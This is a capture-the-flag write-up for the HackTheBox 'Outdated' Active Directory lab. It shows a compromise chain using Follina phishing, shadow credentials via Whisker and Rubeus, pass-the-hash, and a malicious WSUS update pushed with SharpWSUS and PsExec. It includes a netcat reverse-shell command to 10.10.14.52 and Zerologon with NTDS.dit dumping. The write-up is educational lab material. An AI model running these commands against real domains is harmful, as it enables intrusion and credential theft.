# HackTheBox - Outdated

## NMAP

```bash
Nmap scan report for 10.10.11.175                                                                                                    
Host is up (0.42s latency).
Not shown: 65519 filtered ports                                        
PORT      STATE SERVICE       VERSION  
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP, 
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY 
53/tcp    open  domain?                                                
| fingerprint-strings:                                                 
|   DNSVersionBindReqTCP:                                              
|     version          
|_    bind                                                             
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-14 02:03:33Z)                                                  
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                           
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
445/tcp   open  microsoft-ds?                                          
464/tcp   open  kpasswd5?                                              
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)                 
| ssl-cert: Subject:                                                   
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED                                                               
| Issuer: commonName=outdated-DC-CA                
| Public Key type: rsa                                                 
| Public Key bits: 2048                                                                                                                       
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-06-18T05:50:24
| Not valid after:  2024-06-18T06:00:24
| MD5:   ddf3 d13d 3a6a 3fa0 1dee 8321 6784 83dc
|_SHA-1: 7544 3aee ffbc 2ea7 bf61 1380 0a6c 16f1 cd07 afce
|_ssl-date: 2022-08-14T02:06:34+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC.outdated.htb, DNS:outdated.htb, DNS:OUTDATED
| Issuer: commonName=outdated-DC-CA 
| Public Key type: rsa
| Public Key bits: 2048
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8530/tcp  open  http          Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site does not have a title.
8531/tcp  open  unknown
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
54116/tcp open  msrpc         Microsoft Windows RPC
54125/tcp open  msrpc         Microsoft Windows RPC
```

### PORT 139/445 (SMB)
Checking for null authentication on smb we can list shares

<img src="https://i.imgur.com/9O6XieM.png"/>

Checking the `Shares` directory , it has a pdf which we can transfer it on your machine with `get`

<img src="https://i.imgur.com/KecIMt0.png"/>

<img src="https://i.imgur.com/8gmAtnW.png"/>

<img src="https://i.imgur.com/HLjRrRD.png"/>

The pdf talks about a breach on serevers and mentions about emailing the web application links to `itsupport@outdated.htb` through smtp and talks about patching the recent vulnerabilities

Now we can test for these CVEs but here only two CVEs are of high score which means they are critical than the others which are `CVE-2022-30190` dubbed as `Follina` and `CVE-2022-29130`  which is rce through LDAP

## Foothold

### PORT 25 (SMTP)
On connecting with smpt with `telnet`,we  send an email to `itsupport@outdated.htb`  with a link on which we'll get a hit

<img src="https://i.imgur.com/w19ohcV.png"/>

<img src="https://i.imgur.com/uCkaR5P.png"/>

### Testing for CVE-2022-30190 (Follina)

 I tried testing to Follina from john hammond's repository

https://github.com/JohnHammond/msdt-follina

Before running this we need to make a change with the `invoke-request` which is downloading `nc64.exe`  from github, so we need to host it from our machine

<img src="https://i.imgur.com/E5HP6Qg.png"/>

<img src="https://i.imgur.com/K49sX3z.png"/>

Now run the script with hosting the payload on port 80 

<img src="https://i.imgur.com/KM0ECFY.png"/>

And send the url through email

<img src="https://i.imgur.com/MZXo0ME.png"/>

After gettting a shell, I tried listing usernames with `net user` also checking the groups in which `btables` is in but that user doesn't exist

<img src="https://i.imgur.com/MC7F7v5.png"/>
But checking it with `/domain` it does

<img src="https://i.imgur.com/0IXdetf.png"/>

Which shows that this user is in `ITStaff` group 

<img src="https://i.imgur.com/RtF7wLx.png"/>

So probably we are in some container as the IP is different as well

<img src="https://i.imgur.com/3gWPjVY.png"/>

On running linpeas we can see wsus is vulnerable 

<img src="https://i.imgur.com/jN6MzFy.png"/>

We can also see that there are some kerberos tickets which are in the proces

<img src="https://i.imgur.com/zC5NplY.png"/>


I tried using  `sharpwsus` but couldn't proceed further as it wasn't able to inspect the wsus server

https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

<img src="https://i.imgur.com/QvpqYSE.png"/>

So going back to AD enumeartion, I used `sharphound` to dump the data and transffered it through `nc`

<img src="https://i.imgur.com/vJaiKmG.png"/>

<img src="https://i.imgur.com/HnVNmao.png"/>

Uploading the data on bloodhound

<img src="https://i.imgur.com/5OJzQEM.png"/>

From the built in quries it didn't showed a path to escalate for btables

<img src="https://i.imgur.com/UHh59Aq.png"/>

## Privilege Escalation (sflowers)

I wasted a lot of time here until I updated both bloodhound and neo4j to the latest version 

https://linuxhint.com/install-neo4j-ubuntu/

Following this I added the repository for the neo4j 4.4 as the latest version of bloodhound  needs that specific version also latest build of sharphound is also required

```
sudo curl -fsSL https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
sudo add-apt-repository "deb https://debian.neo4j.com stable 4.4"
```

<img src="https://i.imgur.com/dxxeGYU.png"/>

<img src="https://i.imgur.com/6fAMoyK.png"/>

<img src="https://i.imgur.com/6fAMoyK.png"/>

When updating neo4j make sure to set this value to true

<img src="https://i.imgur.com/1iKLGxD.png"/>

Running the updated version of sharphound

https://github.com/BloodHoundAD/SharpHound


<img src="https://i.imgur.com/Ci8YjAD.png"/>

Now after uploading the json files, we'll see a path to escalate from btables users

<img src="https://i.imgur.com/V62pvuo.png"/>

We can see the abuse info for `AddKeyCredentialLink` in which we can shadow credentials for `sflowers` user

<img src="https://i.imgur.com/rjduzZN.png"/>>

<img src="https://i.imgur.com/APmFVvT.png"/>

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials

This article explains the abuse of shadow credentials with `Whisker`

https://github.com/eladshamir/Whisker

For building the exe I used Visual Studio

<img src="https://i.imgur.com/IaMbOqX.png"/>

<img src="https://i.imgur.com/KFyhnaZ.png"/>

<img src="https://i.imgur.com/KFyhnaZ.png"/>


We can run this command for generating a certificate for key credential, which on runnning will show us the command for rubeus for getting NTLM hash for slfowers through PKINIT which is a pre-authentication through certificate

```bash
.\Whisker.exe add /target:sflowers /domain:outdated.htb /dc:dc.outdated.htb
```

<img src="https://i.imgur.com/tRcDD0d.png"/>

And with this command we can get the NTLM hash for sflowers

```
Rubeus.exe asktgt /user:sflowers /certificate:"<generated certificate>/password:"<generatedd certificate password" /domain:outdated.htb /dc:dc.outdated.htb /getcredentials /show
```

<img src="https://i.imgur.com/0I9qGV3.png"/>

Using pass the hash through `evil-winrm` we can login

<img src="https://i.imgur.com/6xWtvHt.png"/>

Looking at the groups we are in `WSUS Administrators` group

<img src="https://i.imgur.com/PpyrH1C.png"/>

We can try runnning sharpwsus again

<img src="https://i.imgur.com/foJ5dR1.png"/>

Now what wsus (Windows Service Update) exactly is, it's a solution for deploying windows updates for systems in a domain where the hosts don't have to reach out to internet to get the updates instead they can get updates internally

To abuse this we can create a malcious update with using `PsExec` as it uses the signed exe from microsoft, and psexec is from sysinternals it won't be flagged so we can execute anyhing using that

```powershell

cmd.exe /c 'SharpWSUS.exe create /payload:"C:\Users\sflowers\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \" net localgroup administrators sflowers /add\"" /title:"Updauwte"'
```

Here the reason why I used cmd to run execute the sharpwsus is command is that it doesn't run properly with powershell and needs to escapte quotes

<img src="https://i.imgur.com/a5XVRWp.png"/>

Approving the update

```
SharpWSUS.exe approve /updateid:d47b1ac0-b4f7-43ca-b21f-dfbcf0499697 /computername:dc.outdated.htb /groupname:"pleauswse"
```

<img src="https://i.imgur.com/7aOBlXs.png"/>

And then check the status if the update has been installed

<img src="https://i.imgur.com/s8aoAaK.png"/>


Having the update installed which will add sflowers into the local administrator group, we can verify it by checking in which groups slfowers belongs to now


<img src="https://i.imgur.com/lw53NhQ.png"/>

Being in administrator's group on domain controller we can dump the SAM and NTDS.dit hashes


<img src="https://i.imgur.com/yz1WNiv.png"/>

Grabbing administrator's hash from NTDS.dit to perform pass the hash

<img src="https://i.imgur.com/zhN3MeJ.png"/>

We can also use any of the exec scripts from impacket

<img src="https://i.imgur.com/K84KUUI.png"/>

<img src="https://i.imgur.com/HXAc4gy.png"/>

Instead of adding the user in administrators group we could have gotten a reverse shell through netcat as well

```powershell
cmd.exe /c 'SharpWSUS.exe create /payload:"C:\Users\sflowers\PsExec64.exe" /args:"-accepteula -s -d cmd.exe
 /c \" C:\Users\sflowers\nc64.exe 10.10.14.52 2222 -e cmd.exe\"" /title:"Updauwte"'

```

<img src="https://i.imgur.com/xcD6VhM.png"/>

<img src="https://i.imgur.com/8a0jNfM.png"/>

<img src="https://i.imgur.com/wXwcU0A.png"/>


## Un-intedned

### Testing for CVE-2020-1472 (Zerologon)

Now this CVE is old, but it's pretty common in AD as the machine was patched with recent CVEs but it this machine maybe vulnerable to zerologon

Which we can test if the machine is vulnerable with a testing script for the CVE

https://github.com/SecuraBV/CVE-2020-1472

The script needs netbios name which is the machine account name, we can get it with `enum4-linux` 

<img src="https://i.imgur.com/FUM2nP3.png"/>

<img src="https://i.imgur.com/4XdVhGY.png"/>

<img src="https://i.imgur.com/qt0M6fj.png"/>

Now that we know it's vulnerable we can exploit it with `-x`

<img src="https://i.imgur.com/XBOXSHC.png"/>


We can dump the NTDS.dit with the computer account which is `DC` with a blank password

<img src="https://i.imgur.com/sDXab57.png"/>

And can perform pass the hash to get a shell as Administrator

<img src="https://i.imgur.com/1tPzg74.png"/>




## References

- https://github.com/JohnHammond/msdt-follina
- https://github.com/rth0pper/zerologon
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- https://linuxhint.com/install-neo4j-ubuntu/
- https://github.com/BloodHoundAD/SharpHound
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/shadow-credentials
- https://github.com/eladshamir/Whisker
- https://securityonline.info/sharpwsus-csharp-tool-for-lateral-movement-through-wsus/
- https://labs.nettitude.com/blog/introducing-sharpwsus/

